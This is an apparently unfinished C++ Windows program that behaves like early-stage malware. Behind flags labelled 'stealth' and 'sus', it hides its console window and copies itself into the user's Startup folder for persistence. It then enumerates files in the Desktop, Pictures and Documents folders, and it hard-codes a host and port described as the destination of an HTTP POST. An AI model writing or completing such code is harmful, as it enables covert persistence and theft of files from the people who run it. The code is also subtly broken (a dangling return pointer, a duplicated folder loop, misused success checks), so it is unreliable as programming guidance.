#pragma comment(lib, "ws2_32.lib")

#include <winsock2.h>
#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <shlobj.h>
#include <shobjidl.h>
#include <string>
#include <iostream>
#include <filesystem>
namespace fs = std::filesystem;

#define susBehaviour false
#define stealthBehaviour false

#define SERV_PORT 8080 // The port the HTTP POST request will be sent to
const char szHost[] = "192.168.1.140";

// Function to generate a user-friendly error message based on the error code
const char* FormatErrorMessage(DWORD errorCode){
	// Use the FormatMessage function to generate the error message
	char errorMessage[1024];
	FormatMessage(
		FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
		NULL,
		errorCode,
		MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
		errorMessage,
		sizeof(errorMessage),
		NULL
	);
	// Return the error message
	return errorMessage;
}

int main() {
#if stealthBehaviour
	ShowWindow(GetConsoleWindow(), SW_HIDE); // Stealth mode activated!
#endif // stealthBehaviour
#if susBehaviour
	// Get the path to the user's startup folder
	char szStartupPath[MAX_PATH] = { 0 };
	if (!SUCCEEDED(SHGetFolderPath(NULL, CSIDL_STARTUP, NULL, 0, szStartupPath))) {
		#if !stealthBehaviour
		DWORD errorCode = GetLastError();
		printf("Error: %d - %s\n", errorCode, FormatErrorMessage(errorCode));
		#endif
	}
	// Get the path to the current executable
	char szExecPath[MAX_PATH] = { 0 };
	if (!SUCCEEDED(GetModuleFileName(NULL, szExecPath, MAX_PATH))) {
		#if !stealthBehaviour
		DWORD errorCode = GetLastError();
		printf("Error: %d - %s\n", errorCode, FormatErrorMessage(errorCode));
		#endif
	}
	// Copy the executable to the startup folder
	// - First, create a string with the new path of the new file
	const char szStartupExecName[] = "a.exe";
	char szStartupExecPath[MAX_PATH];
	sprintf(szStartupExecPath, "%s\\%s", szStartupPath, szStartupExecName);
	if (!SUCCEEDED(CopyFile(szExecPath, szStartupExecPath, NULL))) {
		#if !stealthBehaviour
		DWORD errorCode = GetLastError();
		printf("Error: %d - %s\n", errorCode, FormatErrorMessage(errorCode));
		#endif
	}
	#if !stealthBehaviour
	printf("%s | %s\n", szStartupExecPath, szExecPath);
	#endif
#endif // susBehaviour

	fs::path desktopPath = fs::path("C:\\Users\\") / fs::path(getenv("USERNAME")) / fs::path("Desktop");
	fs::path downloadsPath = fs::path("C:\\Users\\") / fs::path(getenv("USERNAME")) / fs::path("Downloads");
	fs::path picturesPath = fs::path("C:\\Users\\") / fs::path(getenv("USERNAME")) / fs::path("Pictures");
	fs::path documentsPath = fs::path("C:\\Users\\") / fs::path(getenv("USERNAME")) / fs::path("Documents");
	// Iterate through all files
	for (const auto& entry : fs::directory_iterator(desktopPath)) {
		std::cout << entry.path() << std::endl;
	}
	for (const auto& entry : fs::directory_iterator(desktopPath)) {
		std::cout << entry.path() << std::endl;
	}
	for (const auto& entry : fs::directory_iterator(picturesPath)) {
		std::cout << entry.path() << std::endl;
	}
	for (const auto& entry : fs::directory_iterator(documentsPath)) {
		std::cout << entry.path() << std::endl;
	}

	getchar();
	ExitProcess(EXIT_SUCCESS);
}
